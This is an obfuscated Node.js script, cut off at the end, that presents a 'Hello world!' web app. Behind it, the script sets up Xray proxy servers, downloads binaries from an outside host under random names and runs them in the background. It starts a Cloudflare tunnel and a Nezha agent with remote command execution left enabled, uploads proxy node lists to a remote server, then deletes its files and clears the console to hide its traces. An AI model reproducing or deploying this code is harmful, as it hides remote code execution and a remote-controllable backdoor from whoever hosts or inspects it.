const _0x24e039=_0x3147;(function(_0x2a2d2f,_0x50edc7){const _0x460c57=_0x3147,_0x364372=_0x2a2d2f();while(!![]){try{const _0x16f7f3=-parseInt(_0x460c57(0x1ca))/0x1*(-parseInt(_0x460c57(0x266))/0x2)+-parseInt(_0x460c57(0x23e))/0x3*(parseInt(_0x460c57(0x22c))/0x4)+-parseInt(_0x460c57(0x1c9))/0x5+parseInt(_0x460c57(0x21c))/0x6+-parseInt(_0x460c57(0x202))/0x7+parseInt(_0x460c57(0x1c4))/0x8*(-parseInt(_0x460c57(0x1ad))/0x9)+parseInt(_0x460c57(0x1c3))/0xa;if(_0x16f7f3===_0x50edc7)break;else _0x364372['push'](_0x364372['shift']());}catch(_0x96011){_0x364372['push'](_0x364372['shift']());}}}(_0x4427,0xd4151));const express=require(_0x24e039(0x257)),app=express(),axios=require(_0x24e039(0x1eb)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x24e039(0x208)),exec=promisify(require(_0x24e039(0x1d9))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x24e039(0x1cc)]||'',AUTO_ACCESS=process[_0x24e039(0x237)][_0x24e039(0x205)]||![],FILE_PATH=process[_0x24e039(0x237)][_0x24e039(0x1c0)]||_0x24e039(0x1fa),SUB_PATH=process[_0x24e039(0x237)][_0x24e039(0x1bd)]||_0x24e039(0x25c),PORT=process[_0x24e039(0x237)]['SERVER_PORT']||process['env'][_0x24e039(0x1c5)]||0xbb8,UUID=process[_0x24e039(0x237)][_0x24e039(0x1d4)]||'9afd1229-b893-40c1-84dd-51e7ce204913',NEZHA_SERVER=process[_0x24e039(0x237)][_0x24e039(0x1c7)]||'',NEZHA_PORT=process[_0x24e039(0x237)][_0x24e039(0x1f0)]||'',NEZHA_KEY=process[_0x24e039(0x237)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x24e039(0x237)][_0x24e039(0x1ff)]||_0x24e039(0x1fd),ARGO_AUTH=process[_0x24e039(0x237)][_0x24e039(0x1f3)]||_0x24e039(0x231),ARGO_PORT=process['env'][_0x24e039(0x1d1)]||0xcb20,CFIP=process[_0x24e039(0x237)][_0x24e039(0x24b)]||_0x24e039(0x22a),CFPORT=process[_0x24e039(0x237)]['CFPORT']||0x1bb,NAME=process['env'][_0x24e039(0x1c2)]||'';!fs[_0x24e039(0x1cf)](FILE_PATH)?(fs[_0x24e039(0x221)](FILE_PATH),console[_0x24e039(0x1f7)](FILE_PATH+_0x24e039(0x1ef))):console[_0x24e039(0x1f7)](FILE_PATH+_0x24e039(0x269));function generateRandomName(){const _0x357a7b=_0x24e039,_0x4cf014=_0x357a7b(0x1a6);let _0x3a3dde='';for(let _0x254ff7=0x0;_0x254ff7<0x6;_0x254ff7++){_0x3a3dde+=_0x4cf014['charAt'](Math[_0x357a7b(0x1e3)](Math[_0x357a7b(0x1a1)]()*_0x4cf014['length']));}return _0x3a3dde;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x24e039(0x1b5)](FILE_PATH,webName),botPath=path[_0x24e039(0x1b5)](FILE_PATH,botName),subPath=path[_0x24e039(0x1b5)](FILE_PATH,_0x24e039(0x1fb)),listPath=path[_0x24e039(0x1b5)](FILE_PATH,_0x24e039(0x21e)),bootLogPath=path[_0x24e039(0x1b5)](FILE_PATH,_0x24e039(0x25f)),configPath=path[_0x24e039(0x1b5)](FILE_PATH,_0x24e039(0x253));function deleteNodes(){const _0x4baf1d=_0x24e039;try{if(!UPLOAD_URL)return;if(!fs[_0x4baf1d(0x1cf)](subPath))return;let _0x5ba1fd;try{_0x5ba1fd=fs['readFileSync'](subPath,_0x4baf1d(0x1d3));}catch{return null;}const _0x412b36=Buffer['from'](_0x5ba1fd,_0x4baf1d(0x225))['toString'](_0x4baf1d(0x1d3)),_0x578d2a=_0x412b36[_0x4baf1d(0x20d)]('\x0a')[_0x4baf1d(0x1db)](_0x43ff54=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4baf1d(0x201)](_0x43ff54));if(_0x578d2a[_0x4baf1d(0x1b3)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x578d2a}),{'headers':{'Content-Type':_0x4baf1d(0x25d)}})['catch'](_0x2170f1=>{return null;}),null;}catch(_0xda2561){return null;}}function cleanupOldFiles(){try{const _0xb3ac06=fs['readdirSync'](FILE_PATH);_0xb3ac06['forEach'](_0x53094f=>{const _0x480b48=_0x3147,_0x57fbcd=path['join'](FILE_PATH,_0x53094f);try{const _0x4f0df9=fs[_0x480b48(0x1a0)](_0x57fbcd);_0x4f0df9[_0x480b48(0x216)]()&&fs['unlinkSync'](_0x57fbcd);}catch(_0x312648){}});}catch(_0x53b3e4){}}app[_0x24e039(0x20b)]('/',function(_0x29025a,_0x3a0d28){const _0x4dafbd=_0x24e039;_0x3a0d28[_0x4dafbd(0x1a2)](_0x4dafbd(0x1f8));});async function generateConfig(){const _0x853ee5=_0x24e039,_0x1f69be={'log':{'access':_0x853ee5(0x265),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x853ee5(0x230)}],'decryption':_0x853ee5(0x211),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x853ee5(0x263),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x853ee5(0x1e9),'protocol':_0x853ee5(0x1a4),'settings':{'clients':[{'id':UUID}],'decryption':_0x853ee5(0x211)},'streamSettings':{'network':_0x853ee5(0x250),'security':'none'}},{'port':0xbba,'listen':_0x853ee5(0x1e9),'protocol':_0x853ee5(0x1a4),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x853ee5(0x211)},'streamSettings':{'network':'ws','security':_0x853ee5(0x211),'wsSettings':{'path':_0x853ee5(0x232)}},'sniffing':{'enabled':!![],'destOverride':[_0x853ee5(0x222),_0x853ee5(0x1c6),_0x853ee5(0x1f9)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x853ee5(0x263)}},'sniffing':{'enabled':!![],'destOverride':[_0x853ee5(0x222),_0x853ee5(0x1c6),_0x853ee5(0x1f9)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x853ee5(0x1e9),'protocol':_0x853ee5(0x206),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x853ee5(0x211),'wsSettings':{'path':_0x853ee5(0x20e)}},'sniffing':{'enabled':!![],'destOverride':[_0x853ee5(0x222),_0x853ee5(0x1c6),_0x853ee5(0x1f9)],'metadataOnly':![]}}],'dns':{'servers':[_0x853ee5(0x25e)]},'outbounds':[{'protocol':_0x853ee5(0x1d8),'tag':'direct'},{'protocol':_0x853ee5(0x260),'tag':_0x853ee5(0x1b2)}]};fs[_0x853ee5(0x1a7)](path['join'](FILE_PATH,'config.json'),JSON['stringify'](_0x1f69be,null,0x2));}function getSystemArchitecture(){const _0x3eb17c=_0x24e039,_0x1f7b42=os[_0x3eb17c(0x22f)]();return _0x1f7b42==='arm'||_0x1f7b42===_0x3eb17c(0x214)||_0x1f7b42===_0x3eb17c(0x25b)?_0x3eb17c(0x1a3):_0x3eb17c(0x213);}function downloadFile(_0x3658f8,_0x5a9aed,_0x11cf7b){const _0x5e0b32=_0x24e039,_0x53be8d=_0x3658f8;!fs[_0x5e0b32(0x1cf)](FILE_PATH)&&fs[_0x5e0b32(0x221)](FILE_PATH,{'recursive':!![]});const _0xbb000e=fs[_0x5e0b32(0x241)](_0x53be8d);axios({'method':'get','url':_0x5a9aed,'responseType':_0x5e0b32(0x1b6)})['then'](_0x2ef8b7=>{const _0x205fb1=_0x5e0b32;_0x2ef8b7[_0x205fb1(0x1b7)][_0x205fb1(0x1dd)](_0xbb000e),_0xbb000e['on'](_0x205fb1(0x1df),()=>{const _0x1b8118=_0x205fb1;_0xbb000e[_0x1b8118(0x1ea)](),console[_0x1b8118(0x1f7)]('Download\x20'+path[_0x1b8118(0x229)](_0x53be8d)+'\x20successfully'),_0x11cf7b(null,_0x53be8d);}),_0xbb000e['on']('error',_0x588ac9=>{const _0x358475=_0x205fb1;fs['unlink'](_0x53be8d,()=>{});const _0x5ea5b7=_0x358475(0x267)+path[_0x358475(0x229)](_0x53be8d)+_0x358475(0x20f)+_0x588ac9[_0x358475(0x1b0)];console[_0x358475(0x1e6)](_0x5ea5b7),_0x11cf7b(_0x5ea5b7);});})[_0x5e0b32(0x22b)](_0x756586=>{const _0x4d2b31=_0x5e0b32,_0x855882=_0x4d2b31(0x267)+path['basename'](_0x53be8d)+_0x4d2b31(0x20f)+_0x756586[_0x4d2b31(0x1b0)];console[_0x4d2b31(0x1e6)](_0x855882),_0x11cf7b(_0x855882);});}async function downloadFilesAndRun(){const _0x40d30a=_0x24e039,_0x3b8d02=getSystemArchitecture(),_0x21f84d=getFilesForArchitecture(_0x3b8d02);if(_0x21f84d[_0x40d30a(0x1b3)]===0x0){console[_0x40d30a(0x1f7)](_0x40d30a(0x1aa));return;}const _0x583358=_0x21f84d['map'](_0xa2f428=>{return new Promise((_0xe58c88,_0x414648)=>{const _0x8784cb=_0x3147;downloadFile(_0xa2f428[_0x8784cb(0x245)],_0xa2f428[_0x8784cb(0x1f4)],(_0x4bf80c,_0x5c44c7)=>{_0x4bf80c?_0x414648(_0x4bf80c):_0xe58c88(_0x5c44c7);});});});try{await Promise[_0x40d30a(0x1ba)](_0x583358);}catch(_0x57030b){console[_0x40d30a(0x1e6)](_0x40d30a(0x1a9),_0x57030b);return;}function _0x31ae43(_0x4216f6){const _0x22a85d=0x1fd;_0x4216f6['forEach'](_0x3ccb06=>{const _0x301291=_0x3147;fs[_0x301291(0x1cf)](_0x3ccb06)&&fs[_0x301291(0x244)](_0x3ccb06,_0x22a85d,_0x1ad803=>{const _0x5f0db4=_0x301291;_0x1ad803?console[_0x5f0db4(0x1e6)](_0x5f0db4(0x261)+_0x3ccb06+':\x20'+_0x1ad803):console[_0x5f0db4(0x1f7)](_0x5f0db4(0x210)+_0x3ccb06+':\x20'+_0x22a85d[_0x5f0db4(0x1e1)](0x8));});});}const _0x5d9231=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x31ae43(_0x5d9231);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x574361=NEZHA_SERVER[_0x40d30a(0x1cb)](':')?NEZHA_SERVER[_0x40d30a(0x20d)](':')[_0x40d30a(0x24e)]():'',_0x15b3a3=new Set([_0x40d30a(0x22e),_0x40d30a(0x21d),'2096',_0x40d30a(0x264),_0x40d30a(0x1e5),_0x40d30a(0x24c)]),_0x3bbcf0=_0x15b3a3['has'](_0x574361)?_0x40d30a(0x1ce):_0x40d30a(0x1da),_0x4d6621=_0x40d30a(0x256)+NEZHA_KEY+_0x40d30a(0x228)+NEZHA_SERVER+_0x40d30a(0x1af)+_0x3bbcf0+_0x40d30a(0x24a)+UUID;fs[_0x40d30a(0x1a7)](path['join'](FILE_PATH,_0x40d30a(0x23f)),_0x4d6621);const _0x2887ce='nohup\x20'+phpPath+_0x40d30a(0x226)+FILE_PATH+_0x40d30a(0x259);try{await exec(_0x2887ce),console[_0x40d30a(0x1f7)](phpName+_0x40d30a(0x1fc)),await new Promise(_0x14d73b=>setTimeout(_0x14d73b,0x3e8));}catch(_0x5731ba){console[_0x40d30a(0x1e6)](_0x40d30a(0x1be)+_0x5731ba);}}else{let _0x43daae='';const _0xcd57cf=[_0x40d30a(0x22e),_0x40d30a(0x21d),_0x40d30a(0x215),_0x40d30a(0x264),'2083',_0x40d30a(0x24c)];_0xcd57cf['includes'](NEZHA_PORT)&&(_0x43daae=_0x40d30a(0x219));const _0x399dbc='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x40d30a(0x1f6)+NEZHA_KEY+'\x20'+_0x43daae+_0x40d30a(0x1cd);try{await exec(_0x399dbc),console[_0x40d30a(0x1f7)](npmName+'\x20is\x20running'),await new Promise(_0xa95f23=>setTimeout(_0xa95f23,0x3e8));}catch(_0x53daa0){console[_0x40d30a(0x1e6)](_0x40d30a(0x238)+_0x53daa0);}}}else console[_0x40d30a(0x1f7)](_0x40d30a(0x21f));const _0x248ef5='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x248ef5),console['log'](webName+_0x40d30a(0x1fc)),await new Promise(_0x9b3be7=>setTimeout(_0x9b3be7,0x3e8));}catch(_0x14998e){console[_0x40d30a(0x1e6)](_0x40d30a(0x227)+_0x14998e);}if(fs[_0x40d30a(0x1cf)](botPath)){let _0xa1fea3;if(ARGO_AUTH[_0x40d30a(0x1ed)](/^[A-Z0-9a-z=]{120,250}$/))_0xa1fea3=_0x40d30a(0x20c)+ARGO_AUTH;else ARGO_AUTH[_0x40d30a(0x1ed)](/TunnelSecret/)?_0xa1fea3='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0xa1fea3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x40d30a(0x1a5)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0xa1fea3+_0x40d30a(0x212)),console[_0x40d30a(0x1f7)](botName+_0x40d30a(0x1fc)),await new Promise(_0x5bd51a=>setTimeout(_0x5bd51a,0x7d0));}catch(_0x611ac0){console[_0x40d30a(0x1e6)]('Error\x20executing\x20command:\x20'+_0x611ac0);}}await new Promise(_0x50e03d=>setTimeout(_0x50e03d,0x1388));}function _0x3147(_0x487067,_0x140331){const _0x44278a=_0x4427();return _0x3147=function(_0x3147b6,_0x14dcb1){_0x3147b6=_0x3147b6-0x1a0;let _0x14ca86=_0x44278a[_0x3147b6];return _0x14ca86;},_0x3147(_0x487067,_0x140331);}function _0x4427(){const _0x2d8e08=['Unknown','\x0aclient_secret:\x20','express','unshift','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0a\x0atrojan://','aarch64','sub1216','application/json','https+local://8.8.8.8/dns-query','boot.log','blackhole','Empowerment\x20failed\x20for\x20','tunnel.yml','/vmess-argo','2087','/dev/null','48GdhHJe','Download\x20','from','\x20already\x20exists','text/plain;\x20charset=utf-8','statSync','random','send','arm','vless','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','abcdefghijklmnopqrstuvwxyz','writeFileSync','substring','Error\x20downloading\x20files:','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','country_code','http\x20server\x20is\x20running\x20on\x20port:','497358LzcXxa','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','message','&path=%2Fvless-argo%3Fed%3D2560#','block','length','pkill\x20-f\x20\x22[','join','stream','data','/api/add-nodes','forEach','all','Unhandled\x20error\x20in\x20startserver:','countryCode','SUB_PATH','php\x20running\x20error:\x20','response','FILE_PATH','/vmess-argo?ed=2560','NAME','32739330IaudUS','176NzZCiH','PORT','tls','NEZHA_SERVER','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','6719290MZJsDe','43639Qncfvg','includes','PROJECT_URL','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','true','existsSync','\x0a\x20\x20tunnel:\x20','ARGO_PORT','https://arm64.ssss.nyc.mn/agent','utf-8','UUID','ARGO_DOMAIN:','Skipping\x20adding\x20automatic\x20access\x20task','listen','freedom','child_process','false','filter','&fp=firefox&type=ws&host=','pipe','\x20>\x20nul\x202>&1','finish','rm\x20-rf\x20','toString','http://ip-api.com/json/','floor','\x0avless://','2083','error','Add\x20automatic\x20access\x20task\x20faild:\x20','App\x20is\x20running','127.0.0.1','close','axios','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','match','Error\x20in\x20startserver:','\x20is\x20created','NEZHA_PORT','charAt','readFileSync','ARGO_AUTH','fileUrl','Content-Type','\x20-p\x20','log','Hello\x20world!','quic','./tmp','sub.txt','\x20is\x20running','you.chinese88.de5.net','tunnel.json','ARGO_DOMAIN','Error\x20executing\x20command:\x20','test','11823693smqMBQ','Subscription\x20uploaded\x20successfully','org','AUTO_ACCESS','trojan','?encryption=none&security=tls&sni=','util','nohup\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','get','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','split','/trojan-argo','\x20failed:\x20','Empowerment\x20success\x20for\x20','none','\x20>/dev/null\x202>&1\x20&','amd','arm64','2096','isFile','clear','/sub.txt\x20saved\x20successfully','--tls','success','ArgoDomain:','6473586ytFKjk','8443','list.txt','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://amd64.ssss.nyc.mn/agent','mkdirSync','http','status','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','base64','\x20-c\x20\x22','web\x20running\x20error:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','basename','cdns.doon.eu.org','catch','565580ihZDCa','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','443','arch','xtls-rprx-vision','eyJhIjioNTg5ZjIwZDZjMThiYTVlMDIzMDExMzUwMGM2MWM3MGUiLCJ0IjioN2RiOGM0ODgtNmI5Ny00ZjRjLTgtY2Y1YmY1IiwicyI6IlpqUTROMkptTnpjdE1tUTFaaTAwTmpaaUxUZzFOV1V0WkdVMFpUY3laRFpoWVdWaij9','/vless-argo','\x0a\x20\x20\x20\x20','unlinkSync','https://arm64.ssss.nyc.mn/v1','&path=%2Ftrojan-argo%3Fed%3D2560#','env','npm\x20running\x20error:\x20','TunnelSecret','https://arm64.ssss.nyc.mn/web','push','.exe\x20>\x20nul\x202>&1','post','6lgubvC','config.yaml','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','createWriteStream','automatic\x20access\x20task\x20added\x20successfully','win32','chmod','fileName','Error\x20reading\x20boot.log:','set','https://arm64.ssss.nyc.mn/bot','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','CFIP','2053','stringify','pop','https://oooo.serv00.net/add-url','tcp','/api/add-subscriptions','\x20>/dev/null\x202>&1','config.json','firefox'];_0x4427=function(){return _0x2d8e08;};return _0x4427();}function getFilesForArchitecture(_0x8e3f2e){const _0x1bb004=_0x24e039;let _0x9014b7;_0x8e3f2e==='arm'?_0x9014b7=[{'fileName':webPath,'fileUrl':_0x1bb004(0x23a)},{'fileName':botPath,'fileUrl':_0x1bb004(0x248)}]:_0x9014b7=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1e83f2=_0x8e3f2e===_0x1bb004(0x1a3)?_0x1bb004(0x1d2):_0x1bb004(0x220);_0x9014b7['unshift']({'fileName':npmPath,'fileUrl':_0x1e83f2});}else{const _0x5dc88f=_0x8e3f2e==='arm'?_0x1bb004(0x235):'https://amd64.ssss.nyc.mn/v1';_0x9014b7[_0x1bb004(0x258)]({'fileName':phpPath,'fileUrl':_0x5dc88f});}}return _0x9014b7;}function argoType(){const _0x4e1530=_0x24e039;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4e1530(0x1f7)](_0x4e1530(0x249));return;}if(ARGO_AUTH[_0x4e1530(0x1cb)](_0x4e1530(0x239))){fs[_0x4e1530(0x1a7)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0xc2e279=_0x4e1530(0x1d0)+ARGO_AUTH[_0x4e1530(0x20d)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x4e1530(0x1b5)](FILE_PATH,_0x4e1530(0x1fe))+_0x4e1530(0x22d)+ARGO_DOMAIN+_0x4e1530(0x224)+ARGO_PORT+_0x4e1530(0x240);fs[_0x4e1530(0x1a7)](path['join'](FILE_PATH,_0x4e1530(0x262)),_0xc2e279);}else console[_0x4e1530(0x1f7)](_0x4e1530(0x1c8));}async function extractDomains(){const _0x5f57f8=_0x24e039;let _0x4798ce;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4798ce=ARGO_DOMAIN,console[_0x5f57f8(0x1f7)](_0x5f57f8(0x1d5),_0x4798ce),await _0x49334b(_0x4798ce);else try{const _0xc4ad1b=fs[_0x5f57f8(0x1f2)](path[_0x5f57f8(0x1b5)](FILE_PATH,'boot.log'),'utf-8'),_0x591a6e=_0xc4ad1b[_0x5f57f8(0x20d)]('\x0a'),_0x10d262=[];_0x591a6e[_0x5f57f8(0x1b9)](_0x504a19=>{const _0x25897e=_0x5f57f8,_0x500824=_0x504a19[_0x25897e(0x1ed)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x500824){const _0x120be6=_0x500824[0x1];_0x10d262[_0x25897e(0x23b)](_0x120be6);}});if(_0x10d262[_0x5f57f8(0x1b3)]>0x0)_0x4798ce=_0x10d262[0x0],console[_0x5f57f8(0x1f7)](_0x5f57f8(0x21b),_0x4798ce),await _0x49334b(_0x4798ce);else{console[_0x5f57f8(0x1f7)](_0x5f57f8(0x1ec)),fs[_0x5f57f8(0x234)](path[_0x5f57f8(0x1b5)](FILE_PATH,_0x5f57f8(0x25f)));async function _0x4246c6(){const _0x36b2ac=_0x5f57f8;try{process['platform']==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x36b2ac(0x23c)):await exec(_0x36b2ac(0x1b4)+botName[_0x36b2ac(0x1f1)](0x0)+']'+botName[_0x36b2ac(0x1a8)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x518c07){}}_0x4246c6(),await new Promise(_0x397563=>setTimeout(_0x397563,0xbb8));const _0x494857=_0x5f57f8(0x20a)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5f57f8(0x209)+botPath+'\x20'+_0x494857+_0x5f57f8(0x212)),console['log'](botName+_0x5f57f8(0x1fc)),await new Promise(_0x2db081=>setTimeout(_0x2db081,0xbb8)),await extractDomains();}catch(_0x5067fb){console[_0x5f57f8(0x1e6)](_0x5f57f8(0x200)+_0x5067fb);}}}catch(_0x2d93c7){console['error'](_0x5f57f8(0x246),_0x2d93c7);}async function _0x3e3537(){const _0x34013f=_0x5f57f8;try{const _0x1dcb0c=await axios[_0x34013f(0x20b)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x1dcb0c['data']&&_0x1dcb0c[_0x34013f(0x1b7)][_0x34013f(0x1ab)]&&_0x1dcb0c[_0x34013f(0x1b7)][_0x34013f(0x204)])return _0x1dcb0c[_0x34013f(0x1b7)]['country_code']+'_'+_0x1dcb0c['data'][_0x34013f(0x204)];}catch(_0x32f20a){try{const _0x872a87=await axios['get'](_0x34013f(0x1e2),{'timeout':0xbb8});if(_0x872a87[_0x34013f(0x1b7)]&&_0x872a87[_0x34013f(0x1b7)][_0x34013f(0x223)]===_0x34013f(0x21a)&&_0x872a87[_0x34013f(0x1b7)][_0x34013f(0x1bc)]&&_0x872a87[_0x34013f(0x1b7)][_0x34013f(0x204)])return _0x872a87[_0x34013f(0x1b7)]['countryCode']+'_'+_0x872a87[_0x34013f(0x1b7)]['org'];}catch(_0x22b12b){}}return _0x34013f(0x255);}async function _0x49334b(_0x97c7a6){const _0x42a8e1=await _0x3e3537(),_0x383860=NAME?NAME+'-'+_0x42a8e1:_0x42a8e1;return new Promise(_0x4985a8=>{setTimeout(()=>{const _0x5b1458=_0x3147,_0x2ae269={'v':'2','ps':''+_0x383860,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5b1458(0x211),'net':'ws','type':'none','host':_0x97c7a6,'path':_0x5b1458(0x1c1),'tls':_0x5b1458(0x1c6),'sni':_0x97c7a6,'alpn':'','fp':_0x5b1458(0x254)},_0x58b4c3=_0x5b1458(0x1e4)+UUID+'@'+CFIP+':'+CFPORT+_0x5b1458(0x207)+_0x97c7a6+_0x5b1458(0x1dc)+_0x97c7a6+_0x5b1458(0x1b1)+_0x383860+'\x0a\x0avmess://'+Buffer[_0x5b1458(0x268)](JSON[_0x5b1458(0x24d)](_0x2ae269))[_0x5b1458(0x1e1)](_0x5b1458(0x225))+_0x5b1458(0x25a)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x97c7a6+_0x5b1458(0x1dc)+_0x97c7a6+_0x5b1458(0x236)+_0x383860+_0x5b1458(0x233);console[_0x5b1458(0x1f7)](Buffer['from'](_0x58b4c3)[_0x5b1458(0x1e1)](_0x5b1458(0x225))),fs[_0x5b1458(0x1a7)](subPath,Buffer[_0x5b1458(0x268)](_0x58b4c3)[_0x5b1458(0x1e1)](_0x5b1458(0x225))),console['log'](FILE_PATH+_0x5b1458(0x218)),uploadNodes(),app[_0x5b1458(0x20b)]('/'+SUB_PATH,(_0x198cf6,_0x4cc53c)=>{const _0x1e882c=_0x5b1458,_0x20369c=Buffer[_0x1e882c(0x268)](_0x58b4c3)[_0x1e882c(0x1e1)]('base64');_0x4cc53c[_0x1e882c(0x247)](_0x1e882c(0x1f5),_0x1e882c(0x26a)),_0x4cc53c[_0x1e882c(0x1a2)](_0x20369c);}),_0x4985a8(_0x58b4c3);},0x7d0);});}}async function uploadNodes(){const _0x1dbdda=_0x24e039;if(UPLOAD_URL&&PROJECT_URL){const _0x4cba58=PROJECT_URL+'/'+SUB_PATH,_0x4d28ff={'subscription':[_0x4cba58]};try{const _0x11b07d=await axios[_0x1dbdda(0x23d)](UPLOAD_URL+_0x1dbdda(0x251),_0x4d28ff,{'headers':{'Content-Type':_0x1dbdda(0x25d)}});return _0x11b07d&&_0x11b07d[_0x1dbdda(0x223)]===0xc8?(console['log'](_0x1dbdda(0x203)),_0x11b07d):null;}catch(_0x23aff6){if(_0x23aff6[_0x1dbdda(0x1bf)]){if(_0x23aff6['response'][_0x1dbdda(0x223)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1dbdda(0x1cf)](listPath))return;const _0x2ecc56=fs[_0x1dbdda(0x1f2)](listPath,_0x1dbdda(0x1d3)),_0x4e7554=_0x2ecc56[_0x1dbdda(0x20d)]('\x0a')[_0x1dbdda(0x1db)](_0x4591dd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1dbdda(0x201)](_0x4591dd));if(_0x4e7554[_0x1dbdda(0x1b3)]===0x0)return;const _0x5474a9=JSON[_0x1dbdda(0x24d)]({'nodes':_0x4e7554});try{const _0x38ff7b=await axios['post'](UPLOAD_URL+_0x1dbdda(0x1b8),_0x5474a9,{'headers':{'Content-Type':_0x1dbdda(0x25d)}});return _0x38ff7b&&_0x38ff7b[_0x1dbdda(0x223)]===0xc8?(console[_0x1dbdda(0x1f7)]('Nodes\x20uploaded\x20successfully'),_0x38ff7b):null;}catch(_0x3c292f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x55e8cb=_0x3147,_0xc2fb81=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xc2fb81['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xc2fb81[_0x55e8cb(0x23b)](phpPath);process['platform']===_0x55e8cb(0x243)?exec('del\x20/f\x20/q\x20'+_0xc2fb81['join']('\x20')+_0x55e8cb(0x1de),_0x168cfb=>{const _0xc27f1f=_0x55e8cb;console[_0xc27f1f(0x217)](),console[_0xc27f1f(0x1f7)](_0xc27f1f(0x1e8)),console[_0xc27f1f(0x1f7)](_0xc27f1f(0x1ae));}):exec(_0x55e8cb(0x1e0)+_0xc2fb81[_0x55e8cb(0x1b5)]('\x20')+_0x55e8cb(0x252),_0x2655ce=>{const _0x21964c=_0x55e8cb;console['clear'](),console['log'](_0x21964c(0x1e8)),console[_0x21964c(0x1f7)](_0x21964c(0x1ae));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1a8d68=_0x24e039;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1a8d68(0x1f7)](_0x1a8d68(0x1d6));return;}try{const _0x378544=await axios['post'](_0x1a8d68(0x24f),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x1a8d68(0x1f7)](_0x1a8d68(0x242)),_0x378544;}catch(_0x174246){return 